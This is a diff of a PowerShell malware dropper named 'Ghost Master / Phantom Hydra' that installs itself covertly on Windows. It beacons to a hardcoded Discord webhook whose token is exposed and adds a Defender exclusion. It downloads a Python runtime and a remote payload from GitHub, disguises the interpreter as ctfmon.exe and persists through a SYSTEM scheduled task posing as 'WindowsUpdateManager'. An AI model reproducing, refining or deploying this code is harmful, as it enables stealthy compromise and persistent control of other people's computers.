@@ -1,6 +1,18 @@
-# --- THE GHOST MASTER (VERSION 6.5 - TRUE APEX LANDING) ---
+# --- THE GHOST MASTER (VERSION 6.6 - PHANTOM HYDRA PROTOCOL) ---
+# [CRITICAL] Move TLS setting to the absolute top for Webhook reliability
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+
 $WEBHOOK = "https://discord.com/api/webhooks/1505276877214847067/v4AWiiLhBWwcL7P_uCjpFfBo122JWqI6_54pYtphp86YRt_ABvMSJOzPxj0vkqlEMte5"
-function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }
+function Send-Ghost { 
+    param($msg) 
+    Write-Host "[GHOST] $msg" -ForegroundColor Cyan
+    try { 
+        $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" 
+    } catch {
+        Write-Warning "Failed to send Ghost Signal: $($_.Exception.Message)"
+    } 
+}
 
 $ID = "svchost"
 $Path = "$env:APPDATA\$ID"
@@ -12,9 +24,13 @@ if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-
 Set-Location -Path $Path
 
 # Don't restart if we're already running the masked process from this path
-if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }) { exit }
+if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }) { 
+    Write-Host "[!] Hydra already active in this nest. Exiting." -ForegroundColor Yellow
+    exit 
+}
 
 if (Test-Path $PY_MASK) {
+    Write-Host "[*] Re-engaging Hydra from Disk..." -ForegroundColor Green
     $env:PYTHONPATH = $LibPath
     Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
     Send-Ghost "Hydra Re-Engaged from Disk on $($env:COMPUTERNAME)"
@@ -22,23 +38,19 @@ if (Test-Path $PY_MASK) {
 }
 
 Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 1. Clear & Exclusion (Your original ACL cleansing logic)
+# 1. Clear & Exclusion
+Write-Host "[1/5] Clearing the nest and setting exclusions..." -ForegroundColor Gray
 if (Test-Path $Path) { 
     try {
-        # Restore permissions so we can clean the nest
         $Acl = Get-Acl $Path
         $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete,DeleteSubdirectoriesAndFiles","Deny")
         $Acl.RemoveAccessRule($Ar)
         Set-Acl $Path $Acl
     } catch {}
-    
-    # Kill any existing miners or ghosts in this folder
+
     $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
     if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
-    
-    # Wipe the slate for a fresh graft
     Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
 }
 
@@ -46,12 +58,14 @@ New-Item -ItemType Directory -Path $Path -Force | Out-Null
 Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
 
 # 2. Python Core Landing (The Lungs)
+Write-Host "[2/5] Downloading Lungs (Python Core)..." -ForegroundColor Gray
 Send-Ghost "Downloading Lungs..."
 Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile "$Path\py.zip"
 Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
 Remove-Item "$Path\py.zip"
 
 # 3. THE "LUNGS" FIX (The import site graft)
+Write-Host "[3/5] Grafting dependencies..." -ForegroundColor Gray
 $PthFile = Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Select-Object -First 1
 if ($PthFile) { Add-Content -Path $PthFile.FullName -Value "import site" }
 
@@ -61,6 +75,7 @@ Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\ge
 & "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location
 
 # 4. Payload Landing & Robust Extraction
+Write-Host "[4/5] Calling for Lungs & Soul..." -ForegroundColor Gray
 $C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
 $Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdataData.bin"
 Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
@@ -76,18 +91,21 @@ if (Test-Path "$Path\UpdataData.zip") {
     Remove-Item -Path "$Path\temp_bin" -Recurse -Force
 }
 
-# 5. ACTIVATION & RESURRECTION (Your original Resurrection logic + Fixed Quoting)
+# 5. ACTIVATION & RESURRECTION
+Write-Host "[5/5] Registering Resurrection Task..." -ForegroundColor Gray
 if (Test-Path "$Path\python\pythonw.exe") {
     Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force
-    
-    # Ensure the task creates properly with the SYSTEM account
-    $TaskArgs = "/create /tn `"WindowsUpdateManager`" /tr `"\`"$PY_MASK\`" \`"$Path\WinServices.py\`" --id $ID`" /sc minute /mo 1 /ru `"SYSTEM`" /f"
+
+    # Improved Task Quoting for robustness
+    $TaskCommand = "`"$PY_MASK`" `"$Path\WinServices.py`" --id $ID"
+    $TaskArgs = "/create /tn `"WindowsUpdateManager`" /tr `"$TaskCommand`" /sc minute /mo 1 /ru `"SYSTEM`" /f"
     Start-Process -FilePath "schtasks.exe" -ArgumentList $TaskArgs -WindowStyle Hidden -Wait
 
+    Write-Host "[*] Executing Heartbeat..." -ForegroundColor Green
     $env:PYTHONPATH = $LibPath
     Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
     Send-Ghost "Hydra Released. Resurrection Active on $($env:COMPUTERNAME)."
 }
 
-# Final Cleanup
 Remove-Item -Path "$Path\get-pip.py", "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
+Write-Host "[+] Deployment Complete." -ForegroundColor Green
